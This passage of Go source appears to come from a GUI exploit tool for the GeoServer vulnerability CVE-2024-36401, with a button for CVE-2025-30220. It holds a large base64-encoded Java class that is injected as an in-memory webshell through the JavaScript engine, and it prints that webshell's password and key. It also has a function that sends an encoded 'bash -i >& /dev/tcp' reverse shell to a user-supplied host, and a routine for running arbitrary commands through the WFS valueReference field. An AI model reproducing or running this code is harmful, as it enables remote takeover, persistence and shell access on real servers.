8oTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMAVMBVAoAAgFVAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQHAVcKAVgA9AwAogA8CgFYAVoBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24HAVwBACBMamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMAV8BYAoAgAFhAQANZ2V0U3VwZXJjbGFzcwwBYwB8CgCAAWQKAV0AFAEADHRhcmdldE9iamVjdAEACm1ldGhvZE5hbWUBAAdtZXRob2RzAQAbW0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAhTGphdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb247AQAiTGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uOwEACnBhcmFtQ2xhenoBABJbTGphdmEvbGFuZy9DbGFzczsBAAVwYXJhbQEAE1tMamF2YS9sYW5nL09iamVjdDsBAAZtZXRob2QBAAl0ZW1wQ2xhc3MHAWoBABJnZXREZWNsYXJlZE1ldGhvZHMBAB0oKVtMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwwBdAF1CgCAAXYKAPEAggEABmVxdWFscwwBeQBjCgAPAXoBABFnZXRQYXJhbWV0ZXJUeXBlcwEAFCgpW0xqYXZhL2xhbmcvQ2xhc3M7DAF8AX0KAPEBfgoBKAAUAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24HAYEBAApnZXRNZXNzYWdlDAGDAAYKASwBhAoBggAUAQAIPGNsaW5pdD4KAAIAKQAhAAIABAAAAAAAEwABAAUABgABAAcAAAAQAAEAAQAAAAQTAAmwAAAAAAABAAoABgACAAsAAAAEAAEADQAHAAAAFwADAAEAAAALuwAPWRMAEbcAFbAAAAAAAAEAEgAWAAEABwAAANcAAgAFAAAANSq3ACoqtgAuTCu5ADIBAE0suQA2AQCZABosuQA6AQBOKi23AD46BC0ZBL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";
var bt;
try {
    bt = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance().decodeBuffer(str);
} catch (e) {
    bt = java.util.Base64.getDecoder().decode(str);
}
var theUnsafe = java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
theUnsafe.setAccessible(true);
unsafe = theUnsafe.get(null);
unsafe.defineAnonymousClass(java.lang.Class.forName("java.lang.Class"), bt, null).newInstance();
')</wfs:valueReference>
</wfs:GetPropertyValue>`)

	// 创建HTTP POST请求
	req, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte(payload)))
	if err != nil {
		return "", "", err
	}

	// 设置HTTP头
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36")
	req.Header.Set("Content-Type", "application/xml")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Connection", "close")

	//跳过tls证书验证
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	// 如果设置了代理，则使用代理
	if proxyURL != nil {
		tr.Proxy = http.ProxyURL(proxyURL)
	}

	// 发送请求
	client := &http.Client{Transport: tr,
		Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return "", "", err
	}
	defer resp.Body.Close()

	// 读取响应
	body, err := ioutil.ReadAll(resp.Body)
	status_code := resp.Status
	if err != nil {
		return "", "", err
	}

	return string(body), status_code, nil

}

func reverseshell(targetURL, ip string, port string) (string, string, error) {
	address := []byte(fmt.Sprintf(`bash -i >& /dev/tcp/%s/%s 0>&1`, ip, port))
	encoded := base64.StdEncoding.EncodeToString(address)
	command := fmt.Sprintf(`bash -c {echo,%s}|{base64,-d}|{bash,-i}`, encoded)
	payload := fmt.Sprintf(`<wfs:GetPropertyValue service='WFS' version='2.0.0'
xmlns:topp='http://www.openplans.org/topp'
xmlns:fes='http://www.opengis.net/fes/2.0'
xmlns:wfs='http://www.opengis.net/wfs/2.0'
valueReference='exec(java.lang.Runtime.getRuntime(),"%s")'>
<wfs:Query typeNames='topp:states'/>
</wfs:GetPropertyValue>`, command)
	// 创建HTTP POST请求
	req, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte(payload)))
	if err != nil {
		return "", "", err
	}

	// 设置HTTP头
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36")
	req.Header.Set("Content-Type", "application/xml")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Connection", "close")

	//跳过tls证书验证

	if err != nil {
		log.Fatal(err)
	}
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	// 如果设置了代理，则使用代理
	if proxyURL != nil {
		tr.Proxy = http.ProxyURL(proxyURL)
	}
	// 发送请求
	client := &http.Client{Transport: tr,
		Timeout: 4 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return "", "", err
	}
	defer resp.Body.Close()

	// 读取响应
	body, err := ioutil.ReadAll(resp.Body)
	status_code := resp.Status
	if err != nil {
		return "", "", err
	}

	return string(body), status_code, nil

}
func main() {
	// 初始化Fyne应用
	myApp := app.NewWithID("GUI-EXP")
	myWindow := myApp.NewWindow("CVE-2024-36401 Exploit Tool")

	// 创建输入框
	urlEntry := widget.NewEntry()
	urlEntry.SetPlaceHolder("输入GeoServer漏洞URL，例如：http://victim-ip:port/geoserver/wfs")

	domainEntry := widget.NewEntry()
	domainEntry.SetPlaceHolder("输入要执行的命令")

	ipEntry := widget.NewEntry()
	ipEntry.SetPlaceHolder("输入反弹shell的ip")

	portEntry := widget.NewEntry()
	portEntry.SetPlaceHolder("输入反弹的端口")

	// 显示代理 URL 的标签，初始为“无代理”
	proxyLabel = widget.NewLabel("当前代理: 无")

	resultLabel := widget.NewLabel("")

	// 创建按钮
	exploitButton := widget.NewButton("执行漏洞验证", func() {
		targetURL := formatTargetURL(urlEntry.Text)
		command := domainEntry.Text
		if targetURL == "" || command == "" {
			resultLabel.SetText("请确保所有字段都已填写")
			return
		}

		// 执行漏洞利用函数
		result, status_code, err := exploit(targetURL, command)
		if err != nil {
			resultLabel.SetText(fmt.Sprintf("执行失败: %s", err))
		} else {
			resultLabel.SetText(fmt.Sprintf("漏洞验证结果:\n%s\n%s", status_code, result))
		}
	})

	//内存马按钮
	exploitButton1 := widget.NewButton("小于JDK15通过js引擎注入内存马", func() {
		targetURL := formatTargetURL(urlEntry.Text)
		if targetURL == "" {
			resultLabel.SetText("请确保所有字段都已填写")
			return
		}
		go func() {
			result, status_code, err := inject(targetURL)
			if err != nil {
				resultLabel.SetText(fmt.Sprintf("执行失败: %s", err))
			} else {
				resultLabel.SetText(fmt.Sprintf("漏洞验证结果:\n%s\n%s", status_code, result, "加密器: JAVA_AES_BASE64\n密码: pass\n密钥: key\n请求路径: /*\n请求头: Referer: Nplojptkx\n脚本类型: JSP"))
			}

		}()
	})

	exploitButton2 := widget.NewButton("反弹shell", func() {
		targetURL := formatTargetURL(urlEntry.Text)
		ip := ipEntry.Text
		port := portEntry.Text
		if targetURL == "" {
			resultLabel.SetText("请确保所有字段都已填写")
			return
		}
		go func() {
			result, status_code, err := reverseshell(targetURL, ip, port)
			if err != nil {
				resultLabel.SetText(fmt.Sprintf("执行失败: %s", err))
			} else {
				resultLabel.SetText(fmt.Sprintf("漏洞验证结果:\n%s\n%s", status_code, result))
			}

		}()
	})

	//将两个输入框放到水平容器里
	//hBox := container.NewHBox(ipEntry, portEntry, exploitButton2)
	hBox := container.NewVBox(ipEntry, portEntry, exploitButton2)
	ipEntry.Resize(fyne.NewSize(100, ipEntry.MinSize().Width))
	portEntry.Resize(fyne.NewSize(100, portEntry.MinSize().Width))

	// 添加代理按钮
	proxyButton := widget.NewButton("设置代理", func() {
		proxySettingsWindow()
	})

	//CVE-2025-30220
	xxeButton := widget.NewButton("CVE-2025-30220漏洞验证", func() {
		XXE()
	})

	// 布局
	content := container.NewVBox(
		widget.NewLabel("CVE-2024-36401 漏洞验证工具"),
		xxeButton,
		proxyButton,
		urlEntry,
		domainEntry,
		exploitButton,
		exploitButton1,
		hBox,
		proxyLabel,
		resultLabel,
	)

	// 设置窗口内容并显示
	myWindow.SetContent(content)
	myWindow.Resize(fyne.NewSize(600, 300))
	myWindow.ShowAndRun()
}
